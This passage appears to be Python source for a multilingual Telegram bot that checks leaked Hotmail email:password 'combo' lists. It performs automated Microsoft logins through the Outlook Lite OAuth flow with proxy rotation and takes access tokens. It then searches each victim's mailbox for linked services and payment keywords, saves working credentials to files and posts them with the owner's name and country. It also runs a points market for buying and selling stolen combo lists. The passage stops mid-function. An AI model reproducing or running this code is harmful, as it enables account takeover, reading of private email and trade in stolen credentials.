        'review_prompt_ar': '⭐ *কম্বো রেটিং দিন*\n{name} কম্বোটি ১ থেকে ৫ তারকা পর্যন্ত রেটিং দিন:\n(১ থেকে ৫ এর মধ্যে একটি সংখ্যা পাঠান)',
        'review_prompt_en': '⭐ *Rate Combo*\nRate the combo {name} from 1 to 5 stars:\n(send a number 1-5)',
        'review_comment_bn': '✍️ আপনি একটি ঐচ্ছিক মন্তব্য যোগ করতে পারেন (অথবা "স্কিপ" পাঠান):',
        'review_comment_ar': '✍️ আপনি একটি ঐচ্ছিক মন্তব্য যোগ করতে পারেন (অথবা "স্কিপ" পাঠান):',
        'review_comment_en': '✍️ You can add an optional comment (or send "skip"):',
        'review_success_bn': '✅ {name} কম্বোর জন্য আপনার রেটিং সফলভাবে সংরক্ষিত হয়েছে!',
        'review_success_ar': '✅ {name} কম্বোর জন্য আপনার রেটিং সফলভাবে সংরক্ষিত হয়েছে!',
        'review_success_en': '✅ Your rating for combo {name} has been saved!',
        'daily_bonus_bn': '🎁 *দৈনিক বোনাস*\nআপনি ২টি বিনামূল্যে পয়েন্ট পেয়েছেন!\nআপনার বর্তমান পয়েন্ট: {points}',
        'daily_bonus_ar': '🎁 *দৈনিক বোনাস*\nআপনি ২টি বিনামূল্যে পয়েন্ট পেয়েছেন!\nআপনার বর্তমান পয়েন্ট: {points}',
        'daily_bonus_en': '🎁 *Daily Bonus*\nYou got 2 free points!\nYour points now: {points}',
        'daily_bonus_already_bn': '⚠️ আপনি ইতিমধ্যে দৈনিক বোনাস নিয়ে নিয়েছেন। আগামীকাল আবার আসুন।',
        'daily_bonus_already_ar': '⚠️ আপনি ইতিমধ্যে দৈনিক বোনাস নিয়ে নিয়েছেন। আগামীকাল আবার আসুন।',
        'daily_bonus_already_en': '⚠️ You already claimed daily bonus. Come back tomorrow.',
        'low_points_warning_bn': '⚠️ সতর্কতা: আপনার পয়েন্ট ৫ এর কম। আরও পয়েন্ট অর্জন করতে আপনার বন্ধুদের রেফারেল লিংকের মাধ্যমে আমন্ত্রণ জানান!',
        'low_points_warning_ar': '⚠️ সতর্কতা: আপনার পয়েন্ট ৫ এর কম। আরও পয়েন্ট অর্জন করতে আপনার বন্ধুদের রেফারেল লিংকের মাধ্যমে আমন্ত্রণ জানান!',
        'low_points_warning_en': '⚠️ Warning: Your points are less than 5. Invite friends via referral link to earn more points!',
        'discount_code_bn': '🎟️ *ডিসকাউন্ট কোড*\nকম্বোতে ডিসকাউন্ট পেতে কোডটি পাঠান:',
        'discount_code_ar': '🎟️ *ডিসকাউন্ট কোড*\nকম্বোতে ডিসকাউন্ট পেতে কোডটি পাঠান:',
        'discount_code_en': '🎟️ *Discount Code*\nSend the code to get discount on combo:',
        'discount_code_valid_bn': '✅ বৈধ কোড! এই কম্বোতে {percent}% ডিসকাউন্ট। নতুন মূল্য: {new_price} পয়েন্ট',
        'discount_code_valid_ar': '✅ বৈধ কোড! এই কম্বোতে {percent}% ডিসকাউন্ট। নতুন মূল্য: {new_price} পয়েন্ট',
        'discount_code_valid_en': '✅ Valid code! {percent}% discount on this combo. New price: {new_price} points',
        'discount_code_invalid_bn': '❌ অবৈধ ডিসকাউন্ট কোড।',
        'discount_code_invalid_ar': '❌ অবৈধ ডিসকাউন্ট কোড।',
        'discount_code_invalid_en': '❌ Invalid discount code.',
        'most_sold_bn': '🏆 *সর্বাধিক বিক্রিত কম্বো*\n{list}',
        'most_sold_ar': '🏆 *সর্বাধিক বিক্রিত কম্বো*\n{list}',
        'most_sold_en': '🏆 *Best Selling Combos*\n{list}',
        'free_combo_bn': '🎁 *বিনামূল্যে কম্বো*\nআপনি ৫টি রেফারেল সম্পন্ন করেছেন! আপনি একটি বিনামূল্যে কম্বো পেতে পারেন। আপনি কোন কম্বো চান তা নির্বাচন করুন:',
        'free_combo_ar': '🎁 *বিনামূল্যে কম্বো*\nআপনি ৫টি রেফারেল সম্পন্ন করেছেন! আপনি একটি বিনামূল্যে কম্বো পেতে পারেন। আপনি কোন কম্বো চান তা নির্বাচন করুন:',
        'free_combo_en': '🎁 *Free Combo*\nYou have achieved 5 referrals! You can get a free combo. Choose the combo you want:',
        'level_up_bn': '🎉 *লেভেল আপ!*\nআপনি লেভেল {level} এ পৌঁছেছেন এবং কম্বোর জন্য ছাড়কৃত মূল্য পাবেন।',
        'level_up_ar': '🎉 *লেভেল আপ!*\nআপনি লেভেল {level} এ পৌঁছেছেন এবং কম্বোর জন্য ছাড়কৃত মূল্য পাবেন।',
        'level_up_en': '🎉 *Level Up!*\nYou reached level {level} and will get discounted combo prices.',
        'sell_combo_bn': '💰 *কম্বো বিক্রি করুন*\nবটের কাছে বিক্রির জন্য কম্বো ফাইল (txt) পাঠান। এটিতে কমপক্ষে ১০০টি বৈধ হটমেইল অ্যাকাউন্ট আছে কিনা তা পরীক্ষা করা হবে।',
        'sell_combo_ar': '💰 *কম্বো বিক্রি করুন*\nবটের কাছে বিক্রির জন্য কম্বো ফাইল (txt) পাঠান। এটিতে কমপক্ষে ১০০টি বৈধ হটমেইল অ্যাকাউন্ট আছে কিনা তা পরীক্ষা করা হবে।',
        'sell_combo_en': '💰 *Sell Combo*\nSend the combo file (txt) to sell to the bot. It will be checked to ensure at least 100 valid Hotmail accounts.',
        'sell_price_bn': '💰 বিক্রয় মূল্য নির্ধারণ করুন (পয়েন্ট) ১০ থেকে ১০০ এর মধ্যে:',
        'sell_price_ar': '💰 বিক্রয় মূল্য নির্ধারণ করুন (পয়েন্ট) ১০ থেকে ১০০ এর মধ্যে:',
        'sell_price_en': '💰 Set selling price (points) between 10 and 100:',
        'sell_success_bn': '✅ {name} কম্বোটি সফলভাবে কেনা হয়েছে! আপনি {price} পয়েন্ট পেয়েছেন।',
        'sell_success_ar': '✅ {name} কম্বোটি সফলভাবে কেনা হয়েছে! আপনি {price} পয়েন্ট পেয়েছেন।',
        'sell_success_en': '✅ Combo {name} purchased successfully! You got {price} points.',
        'sell_fail_bn': '❌ কম্বোতে হটমেইল ধরনের ১০০টি বৈধ অ্যাকাউন্ট নেই। বৈধ সংখ্যা: {valid}',
        'sell_fail_ar': '❌ কম্বোতে হটমেইল ধরনের ১০০টি বৈধ অ্যাকাউন্ট নেই। বৈধ সংখ্যা: {valid}',
        'sell_fail_en': '❌ Combo does not contain 100 valid Hotmail accounts. Valid count: {valid}',
        'bot_points_low_bn': '❌ বটের পয়েন্ট ব্যালেন্স কম, এখন কেনা সম্ভব নয়।',
        'bot_points_low_ar': '❌ বটের পয়েন্ট ব্যালেন্স কম, এখন কেনা সম্ভব নয়।',
        'bot_points_low_en': '❌ Bot points balance is low, cannot buy now.',
    }
    return texts.get(f'{key}_{lang}', texts.get(f'{key}_bn', key))

def is_subscribed(user_id):
    try:
        member = bot.get_chat_member(FORCED_CHANNEL, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

def create_language_buttons():
    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(telebot.types.InlineKeyboardButton("العربية 🇮🇶", callback_data="lang_ar"), telebot.types.InlineKeyboardButton("English 🇬🇧", callback_data="lang_en"), telebot.types.InlineKeyboardButton("বাংলা 🇧🇩", callback_data="lang_bn"))
    return markup

def create_option_buttons(chat_id):
    lang = user_language.get(chat_id, 'bn')
    markup = telebot.types.InlineKeyboardMarkup(row_width=3)
    option_list = list(services.keys())
    buttons = []
    for idx, service_name in enumerate(option_list):
        color = color_cycle[idx % len(color_cycle)]
        if service_name in selected_options.get(chat_id, []):
            button_text = f'✅ {service_name}'
        else:
            button_text = service_name
        buttons.append(telebot.types.InlineKeyboardButton(button_text, callback_data=f'option_{service_name}', style=color))
    markup.add(*buttons)
    select_all_text = "✅ সব নির্বাচন করুন" if lang == 'bn' else "✅ اختر الكل" if lang == 'ar' else "✅ Select All"
    deselect_all_text = "❌ সব বাতিল করুন" if lang == 'bn' else "❌ إلغاء الكل" if lang == 'ar' else "❌ Deselect All"
    turbo_text = "🚀 টার্বো মোড" if lang == 'bn' else "🚀 Turbo Mode" if lang == 'ar' else "🚀 Turbo Mode"
    if turbo_mode.get(chat_id, False):
        turbo_text = "✅ " + turbo_text
    start_text = "✅ যাচাই শুরু করুন" if lang == 'bn' else "✅ بدء الفحص" if lang == 'ar' else "✅ Start Check"
    markup.add(telebot.types.InlineKeyboardButton(select_all_text, callback_data='select_all', style='primary'), telebot.types.InlineKeyboardButton(deselect_all_text, callback_data='deselect_all', style='danger'))
    markup.add(telebot.types.InlineKeyboardButton(turbo_text, callback_data='toggle_turbo', style='primary'))
    markup.add(telebot.types.InlineKeyboardButton(start_text, callback_data='start_check', style='success'))
    return markup

def create_combo_bank_buttons(chat_id):
    lang = user_language.get(chat_id, 'bn')
    markup = telebot.types.InlineKeyboardMarkup(row_width=1)
    combos = get_combo_list()
    for combo in combos:
        price = get_combo_price(chat_id)
        markup.add(telebot.types.InlineKeyboardButton(f"📁 {combo} ({price} পয়েন্ট)", callback_data=f"buy_combo_{combo}"))
    back_text = "🔙 পেছনে" if lang == 'bn' else "🔙 رجوع" if lang == 'ar' else "🔙 Back"
    markup.add(telebot.types.InlineKeyboardButton(back_text, callback_data='main_menu'))
    return markup

def create_most_sold_buttons(chat_id):
    lang = user_language.get(chat_id, 'bn')
    markup = telebot.types.InlineKeyboardMarkup(row_width=1)
    sorted_combos = sorted(combo_sales_count.items(), key=lambda x: x[1], reverse=True)[:5]
    for combo_name, count in sorted_combos:
        markup.add(telebot.types.InlineKeyboardButton(f"🏆 {combo_name} - {count} বিক্রি", callback_data=f"buy_combo_{combo_name}"))
    back_text = "🔙 পেছনে" if lang == 'bn' else "🔙 رجوع" if lang == 'ar' else "🔙 Back"
    markup.add(telebot.types.InlineKeyboardButton(back_text, callback_data='combo_bank'))
    return markup

def create_delete_combo_buttons(chat_id):
    lang = user_language.get(chat_id, 'bn')
    markup = telebot.types.InlineKeyboardMarkup(row_width=1)
    combos = get_combo_list()
    for combo in combos:
        markup.add(telebot.types.InlineKeyboardButton(f"🗑 {combo}", callback_data=f"delete_combo_{combo}"))
    back_text = "🔙 পেছনে" if lang == 'bn' else "🔙 رجوع" if lang == 'ar' else "🔙 Back"
    markup.add(telebot.types.InlineKeyboardButton(back_text, callback_data='admin_panel'))
    return markup

def update_status_message(chat_id, add_stop_button=False, control_buttons=False):
    good_count = check_results[chat_id]['good']
    bad_count = check_results[chat_id]['bad']
    message = get_text('status', chat_id).format(good=good_count, bad=bad_count)
    if control_buttons and not stop_check_flag.get(chat_id, False):
        markup = telebot.types.InlineKeyboardMarkup(row_width=2)
        stop_text = "⏹️ বন্ধ করুন" if user_language.get(chat_id, 'bn') == 'bn' else "⏹️ إيقاف" if user_language.get(chat_id, 'ar') == 'ar' else "⏹️ Stop"
        pause_text = "⏸️ সাময়িক বন্ধ" if user_language.get(chat_id, 'bn') == 'bn' else "⏸️ إيقاف مؤقت" if user_language.get(chat_id, 'ar') == 'ar' else "⏸️ Pause"
        resume_text = "▶️ পুনরায় শুরু" if user_language.get(chat_id, 'bn') == 'bn' else "▶️ استئناف" if user_language.get(chat_id, 'ar') == 'ar' else "▶️ Resume"
        speed_up_text = "⚡ গতি বাড়ান" if user_language.get(chat_id, 'bn') == 'bn' else "⚡ زيادة السرعة" if user_language.get(chat_id, 'ar') == 'ar' else "⚡ Speed Up"
        speed_down_text = "🐢 গতি কমান" if user_language.get(chat_id, 'bn') == 'bn' else "🐢 تقليل السرعة" if user_language.get(chat_id, 'ar') == 'ar' else "🐢 Speed Down"
        markup.add(telebot.types.InlineKeyboardButton(stop_text, callback_data='stop_check', style='danger'))
        if pause_check_flag.get(chat_id, False):
            markup.add(telebot.types.InlineKeyboardButton(resume_text, callback_data='resume_check', style='success'))
        else:
            markup.add(telebot.types.InlineKeyboardButton(pause_text, callback_data='pause_check', style='primary'))
        markup.add(telebot.types.InlineKeyboardButton(speed_up_text, callback_data='speed_up', style='primary'))
        markup.add(telebot.types.InlineKeyboardButton(speed_down_text, callback_data='speed_down', style='primary'))
        if check_results[chat_id]['message_id']:
            try:
                bot.edit_message_text(message, chat_id=chat_id, message_id=check_results[chat_id]['message_id'], parse_mode="Markdown", reply_markup=markup)
            except ApiTelegramException as e:
                if "message is not modified" not in str(e) and "query is too old" not in str(e):
                    pass
            except Exception:
                pass
            return None
        else:
            return bot.send_message(chat_id, message, parse_mode="Markdown", reply_markup=markup)
    elif add_stop_button and not stop_check_flag.get(chat_id, False):
        markup = telebot.types.InlineKeyboardMarkup()
        stop_text = "⏹️ যাচাই বন্ধ করুন" if user_language.get(chat_id, 'bn') == 'bn' else "⏹️ إيقاف الفحص" if user_language.get(chat_id, 'ar') == 'ar' else "⏹️ Stop Check"
        markup.add(telebot.types.InlineKeyboardButton(stop_text, callback_data='stop_check', style='danger'))
        if check_results[chat_id]['message_id']:
            try:
                bot.edit_message_text(message, chat_id=chat_id, message_id=check_results[chat_id]['message_id'], parse_mode="Markdown", reply_markup=markup)
            except ApiTelegramException as e:
                if "message is not modified" not in str(e) and "query is too old" not in str(e):
                    pass
            except Exception:
                pass
            return None
        else:
            return bot.send_message(chat_id, message, parse_mode="Markdown", reply_markup=markup)
    else:
        if check_results[chat_id]['message_id']:
            try:
                bot.edit_message_text(message, chat_id=chat_id, message_id=check_results[chat_id]['message_id'], parse_mode="Markdown")
            except ApiTelegramException as e:
                if "message is not modified" not in str(e) and "query is too old" not in str(e):
                    pass
            except Exception:
                pass
        else:
            return bot.send_message(chat_id, message, parse_mode="Markdown")
    return None

def get_capture_hotmail(email, password, access_token, cid, chat_id, selected_services, unlinked_file_path, premium_file_path):
    global service_hits
    found_services = []
    has_payment = False
    has_balance = False
    balance_info = ""
    try:
        search_url = "https://outlook.live.com/search/api/v2/query"
        for service_name in selected_services:
            service_info = services.get(service_name)
            if not service_info:
                continue
            senders = service_info["senders"] if "senders" in service_info else [service_info.get("sender", "")]
            for sender in senders:
                if not sender:
                    continue
                payload = {
                    "Cvid": str(uuid.uuid4()),
                    "Scenario": {"Name": "owa.react"},
                    "TimeZone": "UTC",
                    "TextDecorations": "Off",
                    "EntityRequests": [{
                        "EntityType": "Conversation",
                        "ContentSources": ["Exchange"],
                        "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                        "From": 0,
                        "Query": {"QueryString": f"from:{sender}"},
                        "Size": 1,
                        "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                    }]
                }
                headers = {
                    'Authorization': f'Bearer {access_token}',
                    'X-AnchorMailbox': f'CID:{cid}',
                    'Content-Type': 'application/json'
                }
                try:
                    r = requests.post(search_url, json=payload, headers=headers, timeout=10)
                    if r.status_code == 200:
                        data = r.json()
                        if 'EntitySets' in data and len(data['EntitySets']) > 0:
                            entity_set = data['EntitySets'][0]
                            if 'ResultSets' in entity_set and len(entity_set['ResultSets']) > 0:
                                result_set = entity_set['ResultSets'][0]
                                total = result_set.get('Total', 0)
                                if total > 0:
                                    found_services.append(service_name)
                                    output_dir = "Accounts"
                                    if not os.path.exists(output_dir):
                                        os.makedirs(output_dir)
                                    file_path = os.path.join(output_dir, service_info["file"])
                                    if not os.path.exists(file_path):
                                        with open(file_path, 'w', encoding='utf-8') as f:
                                            f.write(f"# Created by {MY_SIGNATURE} {TELEGRAM_CHANNEL}\n\n")
                                    with open(file_path, 'a', encoding='utf-8') as f:
                                        f.write(f"{email}:{password}\n")
                                    with lock:
                                        if service_name not in service_hits:
                                            service_hits[service_name] = 0
                                        service_hits[service_name] += 1
                                    break
                except:
                    continue
                time.sleep(0.05)
        payment_keywords = ["amazon", "google play", "apple gift", "paypal", "balance", "credit", "card"]
        for kw in payment_keywords:
            payload_payment = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                    "From": 0,
                    "Query": {"QueryString": kw},
                    "Size": 1,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }
            try:
                r = requests.post(search_url, json=payload_payment, headers=headers, timeout=10)
                if r.status_code == 200:
                    data = r.json()
                    if 'EntitySets' in data and len(data['EntitySets']) > 0:
                        entity_set = data['EntitySets'][0]
                        if 'ResultSets' in entity_set and len(entity_set['ResultSets']) > 0:
                            result_set = entity_set['ResultSets'][0]
                            total = result_set.get('Total', 0)
                            if total > 0:
                                has_payment = True
                                balance_info = kw
                                break
            except:
                continue
        if found_services:
            if len(found_services) >= 2 and premium_file_path:
                with open(premium_file_path, 'a', encoding='utf-8') as f:
                    f.write(f"{email}:{password} | Services: {', '.join(found_services)}\n")
            if has_payment:
                with lock:
                    if chat_id not in referral_points:
                        referral_points[chat_id] = 0
                    referral_points[chat_id] += 5
                    save_data()
            return found_services
        else:
            if unlinked_file_path:
                with open(unlinked_file_path, 'a', encoding='utf-8') as f:
                    f.write(f"{email}:{password}\n")
            else:
                output_dir = "Accounts"
                if not os.path.exists(output_dir):
                    os.makedirs(output_dir)
                file_path = os.path.join(output_dir, UNLINKED_FILE)
                if not os.path.exists(file_path):
                    with open(file_path, 'w', encoding='utf-8') as f:
                        f.write(f"# Created by {MY_SIGNATURE} {TELEGRAM_CHANNEL}\n\n")
                with open(file_path, 'a', encoding='utf-8') as f:
                    f.write(f"{email}:{password}\n")
            return []
    except Exception as e:
        return []

def get_infoo(email, password, token, cid, chat_id, found_services):
    he = {
        "User-Agent": "Outlook-Android/2.0",
        "Pragma": "no-cache",
        "Accept": "application/json",
        "ForceSync": "false",
        "Authorization": f"Bearer {token}",
        "X-AnchorMailbox": f"CID:{cid}",
        "Host": "substrate.office.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
    }
    try:
        r = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=he).json()
        info_name = (r.get('names', []))
        info_Loca = (r.get('accounts', []))
        name = info_name[0]['displayName'] if info_name else "অনুপলব্ধ"
        Loca = info_Loca[0]['location'] if info_Loca else "অনুপলব্ধ"
    except:
        name = "অনুপলব্ধ"
        Loca = "অনুপলব্ধ"
    jssj = {"AD": "🇦🇩","AE": "🇦🇪","AF": "🇦🇫","AG": "🇦🇬","AI": "🇦🇮","AL": "🇦🇱","AM": "🇦🇲","AO": "🇦🇴","AQ": "🇦🇶","AR": "🇦🇷","AS": "🇦🇸","AT": "🇦🇹","AU": "🇦🇺","AW": "🇦🇼","AX": "🇦🇽","AZ": "🇦🇿","BA": "🇧🇦","BB": "🇧🇧","BD": "🇧🇩","BE": "🇧🇪","BF": "🇧🇫","BG": "🇧🇬","BH": "🇧🇭","BI": "🇧🇮","BJ": "🇧🇯","BL": "🇧🇱","BM": "🇧🇲","BN": "🇧🇳","BO": "🇧🇴","BQ": "🇧🇶","BR": "🇧🇷","BS": "🇧🇸","BT": "🇧🇹","BV": "🇧🇻","BW": "🇧🇼","BY": "🇧🇾","BZ": "🇧🇿","CA": "🇨🇦","CC": "🇨🇨","CD": "🇨🇩","CF": "🇨🇫","CG": "🇨🇬","CH": "🇨🇭","CI": "🇨🇮","CK": "🇨🇰","CL": "🇨🇱","CM": "🇨🇲","CN": "🇨🇳","CO": "🇨🇴","CR": "🇨🇷","CU": "🇨🇺","CV": "🇨🇻","CW": "🇨🇼","CX": "🇨🇽","CY": "🇨🇾","CZ": "🇨🇿","DE": "🇩🇪","DJ": "🇩🇯","DK": "🇩🇰","DM": "🇩🇲","DO": "🇩🇴","DZ": "🇩🇿","EC": "🇪🇨","EE": "🇪🇪","EG": "🇪🇬","EH": "🇪🇭","ER": "🇪🇷","ES": "🇪🇸","ET": "🇪🇹","EU": "🇪🇺","FI": "🇫🇮","FJ": "🇫🇯","FK": "🇫🇰","FM": "🇫🇲","FO": "🇫🇴","FR": "🇫🇷","GA": "🇬🇦","GB-ENG": "🏴","GB-NIR": "🏴","GB-SCT": "🏴","GB-WLS": "🏴","GB": "🇬🇧","GD": "🇬🇩","GE": "🇬🇪","GF": "🇬🇫","GG": "🇬🇬","GH": "🇬🇭","GI": "🇬🇮","GL": "🇬🇱","GM": "🇬🇲","GN": "🇬🇳","GP": "🇬🇵","GQ": "🇬🇶","GR": "🇬🇷","GS": "🇬🇸","GT": "🇬🇹","GU": "🇬🇺","GW": "🇬🇼","GY": "🇬🇾","HK": "🇭🇰","HM": "🇭🇲","HN": "🇭🇳","HR": "🇭🇷","HT": "🇭🇹","HU": "🇭🇺","ID": "🇮🇩","IE": "🇮🇪","IL": "🇮🇱","IM": "🇮🇲","IN": "🇮🇳","IO": "🇮🇴","IQ": "🇮🇶","IR": "🇮🇷","IS": "🇮🇸","IT": "🇮🇹","JE": "🇯🇪","JM": "🇯🇲","JO": "🇯🇴","JP": "🇯🇵","KE": "🇰🇪","KG": "🇰🇬","KH": "🇰🇭","KI": "🇰🇮","KM": "🇰🇲","KN": "🇰🇳","KP": "🇰🇵","KR": "🇰🇷","KW": "🇰🇼","KY": "🇰🇾","KZ": "🇰🇿","LA": "🇱🇦","LB": "🇱🇧","LC": "🇱🇨","LI": "🇱🇮","LK": "🇱🇰","LR": "🇱🇷","LS": "🇱🇸","LT": "🇱🇹","LU": "🇱🇺","LV": "🇱🇻","LY": "🇱🇾","MA": "🇲🇦","MC": "🇲🇨","MD": "🇲🇩","ME": "🇲🇪","MF": "🇲🇫","MG": "🇲🇬","MH": "🇲🇭","MK": "🇲🇰","ML": "🇲🇱","MM": "🇲🇲","MN": "🇲🇳","MO": "🇲🇴","MP": "🇲🇵","MQ": "🇲🇶","MR": "🇲🇷","MS": "🇲🇸","MT": "🇲🇹","MU": "🇲🇺","MV": "🇲🇻","MW": "🇲🇼","MX": "🇲🇽","MY": "🇲🇾","MZ": "🇲🇿","NA": "🇳🇦","NC": "🇳🇨","NE": "🇳🇪","NF": "🇳🇫","NG": "🇳🇬","NI": "🇳🇮","NL": "🇳🇱","NO": "🇳🇴","NP": "🇳🇵","NR": "🇳🇷","NU": "🇳🇺","NZ": "🇳🇿","OM": "🇴🇲","PA": "🇵🇦","PE": "🇵🇪","PF": "🇵🇫","PG": "🇵🇬","PH": "🇵🇭","PK": "🇵🇰","PL": "🇵🇱","PM": "🇵🇲","PN": "🇵🇳","PR": "🇵🇷","PS": "🇵🇸","PT": "🇵🇹","PW": "🇵🇼","PY": "🇵🇾","QA": "🇶🇦","RE": "🇷🇪","RO": "🇷🇴","RS": "🇷🇸","RU": "🇷🇺","RW": "🇷🇼","SA": "🇸🇦","SB": "🇸🇧","SC": "🇸🇨","SD": "🇸🇩","SE": "🇸🇪","SG": "🇸🇬","SH": "🇸🇭","SI": "🇸🇮","SJ": "🇸🇯","SK": "🇸🇰","SL": "🇸🇱","SM": "🇸🇲","SN": "🇸🇳","SO": "🇸🇴","SR": "🇸🇷","SS": "🇸🇸","ST": "🇸🇹","SV": "🇸🇻","SX": "🇸🇽","SY": "🇸🇾","SZ": "🇸🇿","TC": "🇹🇨","TD": "🇹🇩","TF": "🇹🇫","TG": "🇹🇬","TH": "🇹🇭","TJ": "🇹🇯","TK": "🇹🇰","TL": "🇹🇱","TM": "🇹🇲","TN": "🇹🇳","TO": "🇹🇴","TR": "🇹🇷","TT": "🇹🇹","TV": "🇹🇻","TW": "🇹🇼","TZ": "🇹🇿","UA": "🇺🇦","UG": "🇺🇬","UM": "🇺🇲","US": "🇺🇸","UY": "🇺🇾","UZ": "🇺🇿","VA": "🇻🇦","VC": "🇻🇨","VE": "🇻🇪","VG": "🇻🇬","VI": "🇻🇮","VN": "🇻🇳","VU": "🇻🇺","WF": "🇼🇫","WS": "🇼🇸","XK": "🇽🇰","YE": "🇾🇪","YT": "🇾🇹","ZA": "🇿🇦","ZM": "🇿🇲","ZW": "🇿🇼"}
    cccc = jssj.get(Loca, '❔')
    zm = "\n".join([f'ִ𓍼 ✅ ⌇ {service} . 𓍲' for service in found_services])
    message = fmessage = f"""
◇─────────────────◇
    𝗔𝗰𝗰𝗼𝘂𝗻𝘁
◇─────────────────◇
  𝗘𝗺𝗮𝗶𝗹    : `{email}`
  𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱 : `{password}`
◇─────────────────◇
    𝗜𝗡𝗙𝗢
◇─────────────────◇
  𝗡𝗮𝗺𝗲     : `{name}`
  𝗖𝗼𝘂𝗻𝘁𝗿𝘆  : {cccc}
◇─────────────────◇
    𝗟𝗶𝗻𝗸𝗶𝗻𝗴
◇─────────────────◇
{zm}
◇─────────────────◇
"""
    bot.send_message(chat_id, message, parse_mode="Markdown")
    with lock:
        global hit
        hit += 1
        check_results[chat_id]['good'] += 1
    update_status_message(chat_id, add_stop_button=(not stop_check_flag.get(chat_id, False)), control_buttons=True)

def check_account_hotmail(email, password, chat_id, unlinked_file_path, premium_file_path):
    if stop_check_flag.get(chat_id, False):
        return
    if pause_check_flag.get(chat_id, False):
        while pause_check_flag.get(chat_id, False) and not stop_check_flag.get(chat_id, False):
            time.sleep(1)
        if stop_check_flag.get(chat_id, False):
            return
    try:
        session = requests.Session()
        if proxies_list:
            proxy = random.choice(proxies_list)
            proxy_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
            session.proxies.update(proxy_dict)
        url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
        headers1 = {
            "X-OneAuth-AppName": "Outlook Lite",
            "X-Office-Version": "3.11.0-minApi24",
            "X-CorrelationId": str(uuid.uuid4()),
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
            "Host": "odc.officeapps.live.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        }
        r1 = session.get(url1, headers=headers1, timeout=15)
        if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
            with lock:
                check_results[chat_id]['bad'] += 1
                global bad
                bad += 1
            update_status_message(chat_id, add_stop_button=(not stop_check_flag.get(chat_id, False)), control_buttons=True)
            return
        if "MSAccount" not in r1.text:
            with lock:
                check_results[chat_id]['bad'] += 1
                bad += 1
            update_status_message(chat_id, add_stop_button=(not stop_check_flag.get(chat_id, False)), control_buttons=True)
            return
        time.sleep(0.2)
        url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
        r2 = session.get(url2, headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive"
        }, allow_redirects=True, timeout=15)
        url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
        ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
        if not url_match or not ppft_match:
            with lock:
                check_results[chat_id]['bad'] += 1
                bad += 1
            update_status_message(chat_id, add_stop_button=(not stop_check_flag.get(chat_id, False)), control_buttons=True)
            return
        post_url = url_match.group(1).replace("\\/", "/")
        ppft = ppft_match.group(1)
        login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&ps=2&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i19=9960"
        r3 = session.post(post_url, data=login_data, headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Origin": "https://login.live.com",
            "Referer": r2.url
        }, allow_redirects=False, timeout=15)
        if any(x in r3.text for x in ["account or password is incorrect", "error", "Incorrect password", "Invalid credentials"]):
            with lock:
                check_results[chat_id]['bad'] += 1
                bad += 1
            update_status_message(chat_id, add_stop_button=(not stop_check_flag.get(chat_id, False)), control_buttons=True)
            return
        if any(url in r3.text for url in ["identity/confirm", "Abuse", "signedout", "locked"]):
            with lock:
                check_results[chat_id]['bad'] += 1
                bad += 1
            update_status_message(chat_id, add_stop_button=(not stop_check_flag.get(chat_id, False)), control_buttons=True)
            return
        location = r3.headers.get("Location", "")
        if not location:
            with lock:
                check_results[chat_id]['bad'] += 1
                bad += 1
            update_status_message(chat_id, add_stop_button=(not stop_check_flag.get(chat_id, False)), control_buttons=True)
            return
        code_match = re.search(r'code=([^&]+)', location)
        if not code_match:
            with lock:
                check_results[chat_id]['bad'] += 1
                bad += 1
            update_status_message(chat_id, add_stop_button=(not stop_check_flag.get(chat_id, False)), control_buttons=True)
            return
        code = code_match.group(1)
        token_data = {
            "client_info": "1",
            "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
            "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
            "grant_type": "authorization_code",
            "code": code,
            "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
        }
        r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, timeout=15)
        if r4.status_code != 200 or "access_token" not in r4.text:
            with lock:
                check_results[chat_id]['bad'] += 1
                bad += 1
            update_status_message(chat_id, add_stop_button=(not stop_check_flag.get(chat_id, False)), control_buttons=True)
            return
        token_json = r4.json()
        access_token = token_json["access_token"]
        mspcid = None
        for cookie in session.cookies:
